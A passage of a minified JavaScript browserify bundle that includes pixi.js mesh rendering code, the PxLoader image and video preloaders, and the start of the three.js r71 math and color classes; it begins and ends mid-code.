dateTexture(i),r.bindBuffer(r.ELEMENT_ARRAY_BUFFER,t._indexBuffer),r.bufferData(r.ELEMENT_ARRAY_BUFFER,t.indices,r.STATIC_DRAW)):(r.bindBuffer(r.ARRAY_BUFFER,t._vertexBuffer),r.bufferSubData(r.ARRAY_BUFFER,0,t.vertices),r.vertexAttribPointer(n.attributes.aVertexPosition,2,r.FLOAT,!1,0,0),r.bindBuffer(r.ARRAY_BUFFER,t._uvBuffer),r.vertexAttribPointer(n.attributes.aTextureCoord,2,r.FLOAT,!1,0,0),r.activeTexture(r.TEXTURE0),i._glTextures[r.id]?r.bindTexture(r.TEXTURE_2D,i._glTextures[r.id]):this.renderer.updateTexture(i),r.bindBuffer(r.ELEMENT_ARRAY_BUFFER,t._indexBuffer),r.bufferSubData(r.ELEMENT_ARRAY_BUFFER,0,t.indices)),r.drawElements(s,t.indices.length,r.UNSIGNED_SHORT,0)},i.prototype._initWebGL=function(t){var e=this.renderer.gl;t._vertexBuffer=e.createBuffer(),t._indexBuffer=e.createBuffer(),t._uvBuffer=e.createBuffer(),e.bindBuffer(e.ARRAY_BUFFER,t._vertexBuffer),e.bufferData(e.ARRAY_BUFFER,t.vertices,e.DYNAMIC_DRAW),e.bindBuffer(e.ARRAY_BUFFER,t._uvBuffer),e.bufferData(e.ARRAY_BUFFER,t.uvs,e.STATIC_DRAW),t.colors&&(t._colorBuffer=e.createBuffer(),e.bindBuffer(e.ARRAY_BUFFER,t._colorBuffer),e.bufferData(e.ARRAY_BUFFER,t.colors,e.STATIC_DRAW)),e.bindBuffer(e.ELEMENT_ARRAY_BUFFER,t._indexBuffer),e.bufferData(e.ELEMENT_ARRAY_BUFFER,t.indices,e.STATIC_DRAW)},i.prototype.flush=function(){},i.prototype.start=function(){var t=this.renderer.shaderManager.plugins.meshShader;this.renderer.shaderManager.setShader(t)},i.prototype.destroy=function(){}},{"../../core":29,"../Mesh":124}],128:[function(t,e,r){function i(t){n.Shader.call(this,t,["precision lowp float;","attribute vec2 aVertexPosition;","attribute vec2 aTextureCoord;","uniform mat3 translationMatrix;","uniform mat3 projectionMatrix;","varying vec2 vTextureCoord;","void main(void){","   gl_Position = vec4((projectionMatrix * translationMatrix * vec3(aVertexPosition, 1.0)).xy, 0.0, 1.0);","   vTextureCoord = aTextureCoord;","}"].join("\n"),["precision lowp float;","varying vec2 vTextureCoord;","uniform float alpha;","uniform sampler2D uSampler;","void main(void){","   gl_FragColor = texture2D(uSampler, vTextureCoord) * alpha ;","}"].join("\n"),{alpha:{type:"1f",value:0},translationMatrix:{type:"mat3",value:new Float32Array(9)},projectionMatrix:{type:"mat3",value:new Float32Array(9)}},{aVertexPosition:0,aTextureCoord:0})}var n=t("../../core");i.prototype=Object.create(n.Shader.prototype),i.prototype.constructor=i,e.exports=i,n.ShaderManager.registerPlugin("meshShader",i)},{"../../core":29}],129:[function(t,e,r){Object.assign||(Object.assign=t("object-assign"))},{"object-assign":12}],130:[function(t,e,r){t("./Object.assign"),t("./requestAnimationFrame")},{"./Object.assign":129,"./requestAnimationFrame":131}],131:[function(t,e,r){(function(t){if(Date.now&&Date.prototype.getTime||(Date.now=function(){return(new Date).getTime()}),!t.performance||!t.performance.now){var e=Date.now();t.performance||(t.performance={}),t.performance.now=function(){return Date.now()-e}}for(var r=Date.now(),i=["ms","moz","webkit","o"],n=0;n<i.length&&!t.requestAnimationFrame;++n)t.requestAnimationFrame=t[i[n]+"RequestAnimationFrame"],t.cancelAnimationFrame=t[i[n]+"CancelAnimationFrame"]||t[i[n]+"CancelRequestAnimationFrame"];t.requestAnimationFrame||(t.requestAnimationFrame=function(t){if("function"!=typeof t)throw new TypeError(t+"is not a function");var e=Date.now(),i=16+r-e;return 0>i&&(i=0),r=e,setTimeout(function(){r=Date.now(),t(performance.now())},i)}),t.cancelAnimationFrame||(t.cancelAnimationFrame=function(t){clearTimeout(t)})}).call(this,"undefined"!=typeof global?global:"undefined"!=typeof self?self:"undefined"!=typeof window?window:{})},{}]},{},[1])(1)});
}).call(this,typeof global !== "undefined" ? global : typeof self !== "undefined" ? self : typeof window !== "undefined" ? window : {})
},{}],126:[function(require,module,exports){
!function(t){function r(t){t=t||{},this.settings=t,null==t.statusInterval&&(t.statusInterval=5e3),null==t.loggingDelay&&(t.loggingDelay=2e4),null==t.noProgressTimeout&&(t.noProgressTimeout=1/0);var r,s=[],n=[],o=Date.now(),a={QUEUED:0,WAITING:1,LOADED:2,ERROR:3,TIMEOUT:4},i=function(t){return null==t?[]:Array.isArray(t)?t:[t]};this.add=function(t){t.tags=new e(t.tags),null==t.priority&&(t.priority=1/0),s.push({resource:t,status:a.QUEUED})},this.addProgressListener=function(t,r){n.push({callback:t,tags:new e(r)})},this.addCompletionListener=function(t,r){n.push({tags:new e(r),callback:function(r){r.completedCount===r.totalCount&&t(r)}})};var u=function(t){t=i(t);var r=function(r){for(var e=r.resource,s=1/0,n=0;n<e.tags.length;n++)for(var o=0;o<Math.min(t.length,s)&&!(e.tags.all[n]===t[o]&&s>o&&(s=o,0===s))&&0!==s;o++);return s};return function(t,e){var s=r(t),n=r(e);return n>s?-1:s>n?1:t.priority<e.priority?-1:t.priority>e.priority?1:0}};this.start=function(t){r=Date.now();var e=u(t);s.sort(e);for(var n=0,o=s.length;o>n;n++){var i=s[n];i.status=a.WAITING,i.resource.start(this)}setTimeout(l,100)};var l=function(){for(var r=!1,e=Date.now()-o,n=e>=t.noProgressTimeout,i=e>=t.loggingDelay,u=0,c=s.length;c>u;u++){var h=s[u];h.status===a.WAITING&&(h.resource.checkStatus&&h.resource.checkStatus(),h.status===a.WAITING&&(n?h.resource.onTimeout():r=!0))}i&&r&&g(),r&&setTimeout(l,t.statusInterval)};this.isBusy=function(){for(var t=0,r=s.length;r>t;t++)if(s[t].status===a.QUEUED||s[t].status===a.WAITING)return!0;return!1};var c=function(t,r){var e,i,u,l,c,g=null;for(e=0,i=s.length;i>e;e++)if(s[e].resource===t){g=s[e];break}if(null!=g&&g.status===a.WAITING)for(g.status=r,o=Date.now(),u=t.tags.length,e=0,i=n.length;i>e;e++)l=n[e],c=0===l.tags.length?!0:t.tags.intersects(l.tags),c&&h(g,l)};this.onLoad=function(t){c(t,a.LOADED)},this.onError=function(t){c(t,a.ERROR)},this.onTimeout=function(t){c(t,a.TIMEOUT)};var h=function(t,r){var e,n,o,i,u=0,l=0;for(e=0,n=s.length;n>e;e++)o=s[e],i=!1,i=0===r.tags.length?!0:o.resource.tags.intersects(r.tags),i&&(l++,(o.status===a.LOADED||o.status===a.ERROR||o.status===a.TIMEOUT)&&u++);r.callback({resource:t.resource,loaded:t.status===a.LOADED,error:t.status===a.ERROR,timeout:t.status===a.TIMEOUT,completedCount:u,totalCount:l})},g=this.log=function(t){if(window.console){var e=Math.round((Date.now()-r)/1e3);window.console.log("PxLoader elapsed: "+e+" sec");for(var n=0,o=s.length;o>n;n++){var i=s[n];if(t||i.status===a.WAITING){var u="PxLoader: #"+n+" "+i.resource.getName();switch(i.status){case a.QUEUED:u+=" (Not Started)";break;case a.WAITING:u+=" (Waiting)";break;case a.LOADED:u+=" (Loaded)";break;case a.ERROR:u+=" (Error)";break;case a.TIMEOUT:u+=" (Timeout)"}i.resource.tags.length>0&&(u+=" Tags: ["+i.resource.tags.all.join(",")+"]"),window.console.log(u)}}}}}function e(t){if(this.all=[],this.first=null,this.length=0,this.lookup={},t){if(Array.isArray(t))this.all=t.slice(0);else if("object"==typeof t)for(var r in t)t.hasOwnProperty(r)&&this.all.push(r);else this.all.push(t);this.length=this.all.length,this.length>0&&(this.first=this.all[0]);for(var e=0;e<this.length;e++)this.lookup[this.all[e]]=!0}}e.prototype.intersects=function(t){if(0===this.length||0===t.length)return!1;if(1===this.length&&1===t.length)return this.first===t.first;if(t.length<this.length)return t.intersects(this);for(var r in this.lookup)if(t.lookup[r])return!0;return!1},"function"==typeof define&&define.amd&&define("PxLoader",[],function(){return r}),t.PxLoader=r}(window),Date.now||(Date.now=function(){return(new Date).getTime()}),Array.isArray||(Array.isArray=function(t){return"[object Array]"===Object.prototype.toString.call(t)});
},{}],127:[function(require,module,exports){
function PxLoaderImage(n,t,e,i){var o=this,a=null;this.img=new Image,void 0!==i&&(this.img.crossOrigin=i),this.tags=t,this.priority=e;var r=function(){"complete"===o.img.readyState&&(c(),a.onLoad(o))},d=function(){c(),a.onLoad(o)},m=function(){c(),a.onError(o)},c=function(){o.unbind("load",d),o.unbind("readystatechange",r),o.unbind("error",m)};this.start=function(t){a=t,o.bind("load",d),o.bind("readystatechange",r),o.bind("error",m),o.img.src=n},this.checkStatus=function(){o.img.complete&&(c(),a.onLoad(o))},this.onTimeout=function(){c(),o.img.complete?a.onLoad(o):a.onTimeout(o)},this.getName=function(){return n},this.bind=function(n,t){o.img.addEventListener?o.img.addEventListener(n,t,!1):o.img.attachEvent&&o.img.attachEvent("on"+n,t)},this.unbind=function(n,t){o.img.removeEventListener?o.img.removeEventListener(n,t,!1):o.img.detachEvent&&o.img.detachEvent("on"+n,t)}}PxLoader.prototype.addImage=function(n,t,e,i){var o=new PxLoaderImage(n,t,e,i);return this.add(o),o.img},"function"==typeof define&&define.amd&&define("PxLoaderImage",[],function(){return PxLoaderImage});
},{}],128:[function(require,module,exports){
function PxLoaderVideo(n,t,e,i){var d=this,o=null;this.readyEventName="canplaythrough";try{this.vid=new Video}catch(a){this.vid=document.createElement("video")}void 0!==i&&(this.img.crossOrigin=i),this.tags=t,this.priority=e;var r=function(){4===d.vid.readyState&&(c(),o.onLoad(d))},v=function(){c(),o.onLoad(d)},u=function(){c(),o.onError(d)},c=function(){d.unbind("load",v),d.unbind(d.readyEventName,r),d.unbind("error",u)};this.start=function(t){o=t,d.bind("load",v),d.bind(d.readyEventName,r),d.bind("error",u),d.bind("suspend",v),d.vid.src=n,d.vid.load()},this.checkStatus=function(){4===d.vid.readyState&&(c(),o.onLoad(d))},this.onTimeout=function(){c(),4!==d.vid.readyState?o.onLoad(d):o.onTimeout(d)},this.getName=function(){return n},this.bind=function(n,t){d.vid.addEventListener?d.vid.addEventListener(n,t,!1):d.vid.attachEvent&&d.vid.attachEvent("on"+n,t)},this.unbind=function(n,t){d.vid.removeEventListener?d.vid.removeEventListener(n,t,!1):d.vid.detachEvent&&d.vid.detachEvent("on"+n,t)}}PxLoader.prototype.addVideo=function(n,t,e,i){var d=new PxLoaderVideo(n,t,e,i);return this.add(d),d.vid},"function"==typeof define&&define.amd&&define("PxLoaderVideo",[],function(){return PxLoaderVideo});
},{}],129:[function(require,module,exports){
var THREE={REVISION:"71"};"object"==typeof module&&(module.exports=THREE),void 0===Math.sign&&(Math.sign=function(e){return 0>e?-1:e>0?1:+e}),THREE.log=function(){console.log.apply(console,arguments)},THREE.warn=function(){console.warn.apply(console,arguments)},THREE.error=function(){console.error.apply(console,arguments)},THREE.MOUSE={LEFT:0,MIDDLE:1,RIGHT:2},THREE.CullFaceNone=0,THREE.CullFaceBack=1,THREE.CullFaceFront=2,THREE.CullFaceFrontBack=3,THREE.FrontFaceDirectionCW=0,THREE.FrontFaceDirectionCCW=1,THREE.BasicShadowMap=0,THREE.PCFShadowMap=1,THREE.PCFSoftShadowMap=2,THREE.FrontSide=0,THREE.BackSide=1,THREE.DoubleSide=2,THREE.NoShading=0,THREE.FlatShading=1,THREE.SmoothShading=2,THREE.NoColors=0,THREE.FaceColors=1,THREE.VertexColors=2,THREE.NoBlending=0,THREE.NormalBlending=1,THREE.AdditiveBlending=2,THREE.SubtractiveBlending=3,THREE.MultiplyBlending=4,THREE.CustomBlending=5,THREE.AddEquation=100,THREE.SubtractEquation=101,THREE.ReverseSubtractEquation=102,THREE.MinEquation=103,THREE.MaxEquation=104,THREE.ZeroFactor=200,THREE.OneFactor=201,THREE.SrcColorFactor=202,THREE.OneMinusSrcColorFactor=203,THREE.SrcAlphaFactor=204,THREE.OneMinusSrcAlphaFactor=205,THREE.DstAlphaFactor=206,THREE.OneMinusDstAlphaFactor=207,THREE.DstColorFactor=208,THREE.OneMinusDstColorFactor=209,THREE.SrcAlphaSaturateFactor=210,THREE.MultiplyOperation=0,THREE.MixOperation=1,THREE.AddOperation=2,THREE.UVMapping=300,THREE.CubeReflectionMapping=301,THREE.CubeRefractionMapping=302,THREE.EquirectangularReflectionMapping=303,THREE.EquirectangularRefractionMapping=304,THREE.SphericalReflectionMapping=305,THREE.RepeatWrapping=1e3,THREE.ClampToEdgeWrapping=1001,THREE.MirroredRepeatWrapping=1002,THREE.NearestFilter=1003,THREE.NearestMipMapNearestFilter=1004,THREE.NearestMipMapLinearFilter=1005,THREE.LinearFilter=1006,THREE.LinearMipMapNearestFilter=1007,THREE.LinearMipMapLinearFilter=1008,THREE.UnsignedByteType=1009,THREE.ByteType=1010,THREE.ShortType=1011,THREE.UnsignedShortType=1012,THREE.IntType=1013,THREE.UnsignedIntType=1014,THREE.FloatType=1015,THREE.HalfFloatType=1025,THREE.UnsignedShort4444Type=1016,THREE.UnsignedShort5551Type=1017,THREE.UnsignedShort565Type=1018,THREE.AlphaFormat=1019,THREE.RGBFormat=1020,THREE.RGBAFormat=1021,THREE.LuminanceFormat=1022,THREE.LuminanceAlphaFormat=1023,THREE.RGBEFormat=THREE.RGBAFormat,THREE.RGB_S3TC_DXT1_Format=2001,THREE.RGBA_S3TC_DXT1_Format=2002,THREE.RGBA_S3TC_DXT3_Format=2003,THREE.RGBA_S3TC_DXT5_Format=2004,THREE.RGB_PVRTC_4BPPV1_Format=2100,THREE.RGB_PVRTC_2BPPV1_Format=2101,THREE.RGBA_PVRTC_4BPPV1_Format=2102,THREE.RGBA_PVRTC_2BPPV1_Format=2103,THREE.Projector=function(){THREE.error("THREE.Projector has been moved to /examples/js/renderers/Projector.js."),this.projectVector=function(e,t){THREE.warn("THREE.Projector: .projectVector() is now vector.project()."),e.project(t)},this.unprojectVector=function(e,t){THREE.warn("THREE.Projector: .unprojectVector() is now vector.unproject()."),e.unproject(t)},this.pickingRay=function(e,t){THREE.error("THREE.Projector: .pickingRay() is now raycaster.setFromCamera().")}},THREE.CanvasRenderer=function(){THREE.error("THREE.CanvasRenderer has been moved to /examples/js/renderers/CanvasRenderer.js"),this.domElement=document.createElement("canvas"),this.clear=function(){},this.render=function(){},this.setClearColor=function(){},this.setSize=function(){}},THREE.Color=function(e){return 3===arguments.length?this.setRGB(arguments[0],arguments[1],arguments[2]):this.set(e)},THREE.Color.prototype={constructor:THREE.Color,r:1,g:1,b:1,set:function(e){return e instanceof THREE.Color?this.copy(e):"number"==typeof e?this.setHex(e):"string"==typeof e&&this.setStyle(e),this},setHex:function(e){return e=Math.floor(e),this.r=(e>>16&255)/255,this.g=(e>>8&255)/255,this.b=(255&e)/255,this},setRGB:function(e,t,r){return this.r=e,this.g=t,this.b=r,this},setHSL:function(e,t,r){if(0===t)this.r=this.g=this.b=r;else{var i=function(e,t,r){return 0>r&&(r+=1),r>1&&(r-=1),1/6>r?e+6*(t-e)*r:.5>r?t:2/3>r?e+6*(t-e)*(2/3-r):e},n=.5>=r?r*(1+t):r+t-r*t,a=2*r-n;this.r=i(a,n,e+1/3),this.g=i(a,n,e),this.b=i(a,n,e-1/3)}return this},setStyle:function(e){if(/^rgb\((\d+), ?(\d+), ?(\d+)\)$/i.test(e)){var t=/^rgb\((\d+), ?(\d+), ?(\d+)\)$/i.exec(e);return this.r=Math.min(255,parseInt(t[1],10))/255,this.g=Math.min(255,parseInt(t[2],10))/255,this.b=Math.min(255,parseInt(t[3],10))/255,this}if(/^rgb\((\d+)\%, ?(\d+)\%, ?(\d+)\%\)$/i.test(e)){var t=/^rgb\((\d+)\%, ?(\d+)\%, ?(\d+)\%\)$/i.exec(e);return this.r=Math.min(100,parseInt(t[1],10))/100,this.g=Math.min(100,parseInt(t[2],10))/100,this.b=Math.min(100,parseInt(t[3],10))/100,this}if(/^\#([0-9a-f]{6})$/i.test(e)){var t=/^\#([0-9a-f]{6})$/i.exec(e);return this.setHex(parseInt(t[1],16)),this}if(/^\#([0-9a-f])([0-9a-f])([0-9a-f])$/i.test(e)){var t=/^\#([0-9a-f])([0-9a-f])([0-9a-f])$/i.exec(e);return this.setHex(parseInt(t[1]+t[1]+t[2]+t[2]+t[3]+t[3],16)),this}return/^(\w+)$/i.test(e)?(this.setHex(THREE.ColorKeywords[e]),this):void 0},copy:function(e){return this.r=e.r,this.g=e.g,this.b=e.b,this},copyGammaToLinear:function(e,t){return void 0===t&&(t=2),this.r=Math.pow(e.r,t),this.g=Math.pow(e.g,t),this.b=Math.pow(e.b,t),this},copyLinearToGamma:function(e,t){void 0===t&&(t=2);var r=t>0?1/t:1;return this.r=Math.pow(e.r,r),this.g=Math.pow(e.g,r),this.b=Math.pow(e.b,r),this},convertGammaToLinear:function(){var e=this.r,t=this.g,r=this.b;return this.r=e*e,this.g=t*t,this.b=r*r,this},convertLinearToGamma:function(){return this.r=Math.sqrt(this.r),this.g=Math.sqrt(this.g),this.b=Math.sqrt(this.b),this},getHex:function(){return 255*this.r<<16^255*this.g<<8^255*this.b<<0},getHexString:function(){return("000000"+this.getHex().toString(16)).slice(-6)},getHSL:function(e){var t,r,i=e||{h:0,s:0,l:0},n=this.r,a=this.g,o=this.b,s=Math.max(n,a,o),h=Math.min(n,a,o),l=(h+s)/2;if(h===s)t=0,r=0;else{var c=s-h;switch(r=.5>=l?c/(s+h):c/(2-s-h),s){case n:t=(a-o)/c+(o>a?6:0);break;case a:t=(o-n)/c+2;break;case o:t=(n-a)/c+4}t/=6}return i.h=t,i.s=r,i.l=l,i},getStyle:function(){return"rgb("+(255*this.r|0)+","+(255*this.g|0)+","+(255*this.b|0)+")"},offsetHSL:function(e,t,r){var i=this.getHSL();return i.h+=e,i.s+=t,i.l+=r,this.setHSL(i.h,i.s,i.l),this},add:function(e){return this.r+=e.r,this.g+=e.g,this.b+=e.b,this},addColors:function(e,t){return this.r=e.r+t.r,this.g=e.g+t.g,this.b=e.b+t.b,this},addScalar:function(e){return this.r+=e,this.g+=e,this.b+=e,this},multiply:function(e){return this.r*=e.r,this.g*=e.g,this.b*=e.b,this},multiplyScalar:function(e){return this.r*=e,this.g*=e,this.b*=e,this},lerp:function(e,t){return this.r+=(e.r-this.r)*t,this.g+=(e.g-this.g)*t,this.b+=(e.b-this.b)*t,this},equals:function(e){return e.r===this.r&&e.g===this.g&&e.b===this.b},fromArray:function(e){return this.r=e[0],this.g=e[1],this.b=e[2],this},toArray:function(e,t){return void 0===e&&(e=[]),void 0===t&&(t=0),e[t]=this.r,e[t+1]=this.g,e[t+2]=this.b,e},clone:function(){return(new THREE.Color).setRGB(this.r,this.g,this.b)}},THREE.ColorKeywords={aliceblue:15792383,antiquewhite:16444375,aqua:65535,aquamarine:8388564,azure:15794175,beige:16119260,bisque:16770244,black:0,blanchedalmond:16772045,blue:255,blueviolet:9055202,brown:10824234,burlywood:14596231,cadetblue:6266528,chartreuse:8388352,chocolate:13789470,coral:16744272,cornflowerblue:6591981,cornsilk:16775388,crimson:14423100,cyan:65535,darkblue:139,darkcyan:35723,darkgoldenrod:12092939,darkgray:11119017,darkgreen:25600,darkgrey:11119017,darkkhaki:12433259,darkmagenta:9109643,darkolivegreen:5597999,darkorange:16747520,darkorchid:10040012,darkred:9109504,darksalmon:15308410,darkseagreen:9419919,darkslateblue:4734347,darkslategray:3100495,darkslategrey:3100495,darkturquoise:52945,darkviolet:9699539,deeppink:16716947,deepskyblue:49151,dimgray:6908265,dimgrey:6908265,dodgerblue:2003199,firebrick:11674146,floralwhite:16775920,forestgreen:2263842,fuchsia:16711935,gainsboro:14474460,ghostwhite:16316671,gold:16766720,goldenrod:14329120,gray:8421504,green:32768,greenyellow:11403055,grey:8421504,honeydew:15794160,hotpink:16738740,indianred:13458524,indigo:4915330,ivory:16777200,khaki:15787660,lavender:15132410,lavenderblush:16773365,lawngreen:8190976,lemonchiffon:16775885,lightblue:11393254,lightcoral:15761536,lightcyan:14745599,lightgoldenrodyellow:16448210,lightgray:13882323,lightgreen:9498256,lightgrey:13882323,lightpink:16758465,lightsalmon:16752762,lightseagreen:2142890,lightskyblue:8900346,lightslategray:7833753,lightslategrey:7833753,lightsteelblue:11584734,lightyellow:16777184,lime:65280,limegreen:3329330,linen:16445670,magenta:16711935,maroon:8388608,mediumaquamarine:6737322,mediumblue:205,mediumorchid:12211667,mediumpurple:9662683,mediumseagreen:3978097,mediumslateblue:8087790,mediumspringgreen:64154,mediumturquoise:4772300,mediumvioletred:13047173,midnightblue:1644912,mintcream:16121850,mistyrose:16770273,moccasin:16770229,navajowhite:16768685,navy:128,oldlace:16643558,olive:8421376,olivedrab:7048739,orange:16753920,orangered:16729344,orchid:14315734,palegoldenrod:15657130,palegreen:10025880,paleturquoise:11529966,palevioletred:14381203,papayawhip:16773077,peachpuff:16767673,peru:13468991,pink:16761035,plum:14524637,powderblue:11591910,purple:8388736,red:16711680,rosybrown:12357519,royalblue:4286945,saddlebrown:9127187,salmon:16416882,sandybrown:16032864,seagreen:3050327,seashell:16774638,sienna:10506797,silver:12632256,skyblue:8900331,slateblue:6970061,slategray:7372944,slategrey:7372944,snow:16775930,springgreen:65407,steelblue:4620980,tan:13808780,teal:32896,thistle:14204888,tomato:16737095,turquoise:4251856,violet:15631086,wheat:16113331,white:16777215,whitesmoke:16119285,yellow:16776960,yellowgreen:10145074},THREE.Quaternion=function(e,t,r,i){this._x=e||0,this._y=t||0,this._z=r||0,this._w=void 0!==i?i:1},THREE.Quaternion.prototype={constructor:THREE.Quaternion,_x:0,_y:0,_z:0,_w:0,get x(){return this._x},set x(e){this._x=e,this.onChangeCallback()},get y(){return this._y},set y(e){this._y=e,this.onChangeCallback()},get z(){return this._z},set z(e){this._z=e,this.onChangeCallback()},get w(){return this._w},set w(e){this._w=e,this.onChangeCallback()},set:function(e,t,r,i){return this._x=e,this._y=t,this._z=r,this._w=i,this.onChangeCallback(),this},copy:function(e){return this._x=e.x,this._y=e.y,this._z=e.z,this._w=e.w,this.onChangeCallback(),this},setFromEuler:function(e,t){if(e instanceof THREE.Euler==!1)throw new Error("THREE.Quaternion: .setFromEuler() now expects a Euler rotation rather than a Vector3 and order.");var r=Math.cos(e._x/2),i=Math.cos(e._y/2),n=Math.cos(e._z/2),a=Math.sin(e._x/2),o=Math.sin(e._y/2),s=Math.sin(e._z/2);return"XYZ"===e.order?(this._x=a*i*n+r*o*s,this._y=r*o*n-a*i*s,this._z=r*i*s+a*o*n,this._w=r*i*n-a*o*s):"YXZ"===e.order?(this._x=a*i*n+r*o*s,this._y=r*o*n-a*i*s,this._z=r*i*s-a*o*n,this._w=r*i*n+a*o*s):"ZXY"===e.order?(this._x=a*i*n-r*o*s,this._y=r*o*n+a*i*s,this._z=r*i*s+a*o*n,this._w=r*i*n-a*o*s):"ZYX"===e.order?(this._x=a*i*n-r*o*s,this._y=r*o*n+a*i*s,this._z=r*i*s-a*o*n,this._w=r*i*n+a*o*s):"YZX"===e.order?(this._x=a*i*n+r*o*s,this._y=r*o*n+a*i*s,this._z=r*i*s-a*o*n,this._w=r*i*n-a*o*s):"XZY"===e.order&&(this._x=a*i*n-r*o*s,this._y=r*o*n-a*i*s,this._z=r*i*s+a*o*n,this._w=r*i*n+a*o*s),t!==!1&&this.onChangeCallback(),this},setFromAxisAngle:function(e,t){var r=t/2,i=Math.sin(r);return this._x=e.x*i,this._y=e.y*i,this._z=e.z*i,this._w=Math.cos(r),this.onChangeCallback(),this},setFromRotationMatrix:function(e){var t,r=e.elements,i=r[0],n=r[4],a=r[8],o=r[1],s=r[5],h=r[9],l=r[2],c=r[6],u=r[10],E=i+s+u;return E>0?(t=.5/Math.sqrt(E+1),this._w=.25/t,this._x=(c-h)*t,this._y=(a-l)*t,this._z=(o-n)*t):i>s&&i>u?(t=2*Math.sqrt(1+i-s-u),this._w=(c-h)/t,this._x=.25*t,this._y=(n+o)/t,this._z=(a+l)/t):s>u?(t=2*Math.sqrt(1+s-i-u),this._w=(a-l)/t,this._x=(n+o)/t,this._y=.25*t,this._z=(h+c)/t):(t=2*Math.sqrt(1+u-i-s),this._w=(o-n)/t,this._x=(a+l)/t,this._y=(h+c)/t,this._z=.25*t),this.onChangeCallback(),this},setFromUnitVectors:function(){var e,t,r=1e-6;return function(i,n){return void 0===e&&(e=new THREE.Vector3),t=i.dot(n)+1,r>t?(t=0,Math.abs(i.x)>Math.abs(i.z)?e.set(-i.y,i.x,0):e.set(0,-i.z,i.y)):e.crossVectors(i,n),this._x=e.x,this._y=e.y,this._z=e.z,this._w=t,this.normalize(),this}}(),inverse:function(){return this.conjugate().normalize(),this},conjugate:function(){return this._x*=-1,this._y*=-1,this._z*=-1,this.onChangeCallback(),this},dot:function(e){return this._x*e._x+this._y*e._y+this._z*e._z+this._w*e._w},lengthSq:function(){return this._x*this._x+this._y*this._y+this._z*this._z+this._w*this._w},length:function(){return Math.sqrt(this._x*this._x+this._y*this._y+this._z*this._z+this._w*this._w)},normalize:function(){var e=this.length();return 0===e?(this._x=0,this._y=0,this._z=0,this._w=1):(e=1/e,this._x=this._x*e,this._y=this._y*e,this._z=this._z*e,this._w=this._w*e),this.onChangeCallback(),this},multiply:function(e,t){return void 0!==t?(THREE.warn("THREE.Quaternion: .multiply() now only accepts one argument. Use .multiplyQuaternions( a, b ) instead."),this.multiplyQuaternions(e,t)):this.multiplyQuaternions(this,e)},multiplyQuaternions:function(e,t){var r=e._x,i=e._y,n=e._z,a=e._w,o=t._x,s=t._y,h=t._z,l=t._w;return this._x=r*l+a*o+i*h-n*s,this._y=i*l+a*s+n*o-r*h,this._z=n*l+a*h+r*s-i*o,this._w=a*l-r*o-i*s-n*h,this.onChangeCallback(),this},multiplyVector3:function(e){return THREE.warn("THREE.Quaternion: .multiplyVector3() has been removed. Use is now vector.applyQuaternion( quaternion ) instead."),e.applyQuaternion(this)},slerp:function(e,t){if(0===t)return this;if(1===t)return this.copy(e);var r=this._x,i=this._y,n=this._z,a=this._w,o=a*e._w+r*e._x+i*e._y+n*e._z;if(0>o?(this._w=-e._w,this._x=-e._x,this._y=-e._y,this._z=-e._z,o=-o):this.copy(e),o>=1)return this._w=a,this._x=r,this._y=i,this._z=n,this;var s=Math.acos(o),h=Math.sqrt(1-o*o);if(Math.abs(h)<.001)return this._w=.5*(a+this._w),this._x=.5*(r+this._x),this._y=.5*(i+this._y),this._z=.5*(n+this._z),this;var l=Math.sin((1-t)*s)/h,c=Math.sin(t*s)/h;return this._w=a*l+this._w*c,this._x=r*l+this._x*c,this._y=i*l+this._y*c,this._z=n*l+this._z*c,this.onChangeCallback(),this},equals:function(e){return e._x===this._x&&e._y===this._y&&e._z===this._z&&e._w===this._w},fromArray:function(e,t){return void 0===t&&(t=0),this._x=e[t],this._y=e[t+1],this._z=e[t+2],this._w=e[t+3],this.onChangeCallback(),this},toArray:function(e,t){return void 0===e&&(e=[]),void 0===t&&(t=0),e[t]=this._x,e[t+1]=this._y,e[t+2]=this._z,e[t+3]=this._w,e},onChange:function(e){return this.onChangeCallback=e,this},onChangeCallback:function(){},clone:function(){return new THREE.Quaternion(this._x,this._y,this._z,this._w)}},THREE.Quaternion.slerp=function(e,t,r,i){return r.copy(e).slerp(t,i)},THREE.Vector2=function(e,t){this.x=e||0,this.y=t||0},THREE.Vector2.prototype={constructor:THREE.Vector2,set:function(e,t){return this.x=e,this.y=t,this},setX:function(e){return this.x=e,this},setY:function(e){return this.y=e,this},setComponent:function(e,t){switch(e){case 0:this.x=t;break;case 1:this.y=t;break;default:throw new Error("index is out of range: "+e)}},getComponent:function(e){switch(e){case 0:return this.x;case 1:return this.y;default:throw new Error("index is out of range: "+e)}},copy:function(e){return this.x=e.x,this.y=e.y,this},add:function(e,t){return void 0!==t?(THREE.warn("THREE.Vector2: .add() now only accepts one argument. Use .addVectors( a, b ) instead."),this.addVectors(e,t)):(this.x+=e.x,this.y+=e.y,this)},addScalar:function(e){return this.x+=e,this.y+=e,this},addVectors:function(e,t){return this.x=e.x+t.x,this.y=e.y+t.y,this},sub:function(e,t){return void 0!==t?(THREE.warn("THREE.Vector2: .sub() now only accepts one argument. Use .subVectors( a, b ) instead."),this.subVectors(e,t)):(this.x-=e.x,this.y-=e.y,this)},subScalar:function(e){return this.x-=e,this.y-=e,this},subVectors:function(e,t){return this.x=e.x-t.x,this.y=e.y-t.y,this},multiply:function(e){return this.x*=e.x,this.y*=e.y,this},multiplyScalar:function(e){return this.x*=e,this.y*=e,this},divide:function(e){return this.x/=e.x,this.y/=e.y,this},divideScalar:function(e){if(0!==e){var t=1/e;this.x*=t,this.y*=t}else this.x=0,this.y=0;return this},min:function(e){return this.x>e.x&&(this.x=e.x),this.y>e.y&&(this.y=e.y),this},max:function(e){return this.x<e.x&&(this.x=e.x),this.y<e.y&&(this.y=e.y),this},clamp:function(e,t){return this.x<e.x?this.x=e.x:this.x>t.x&&(this.x=t.x),this.y<e.y?this.y=e.y:this.y>t.y&&(this.y=t.y),this},clampScalar:function(){var e,t;return function(r,i){return void 0===e&&(e=new THREE.Vector2,t=new THREE.Vector2),e.set(r,r),t.set(i,i),this.clamp(e,t)}}(),floor:function(){return this.x=Math.floor(this.x),this.y=Math.floor(this.y),this},ceil:function(){return this.x=Math.ceil(this.x),this.y=Math.ceil(this.y),this},round:function(){return this.x=Math.round(this.x),this.y=Math.round(this.y),this},roundToZero:function(){return this.x=this.x<0?Math.ceil(this.x):Math.floor(this.x),this.y=this.y<0?Math.ceil(this.y):Math.floor(this.y),this},negate:function(){return this.x=-this.x,this.y=-this.y,this},dot:function(e){return this.x*e.x+this.y*e.y},lengthSq:function(){return this.x*this.x+this.y*this.y},length:function(){return 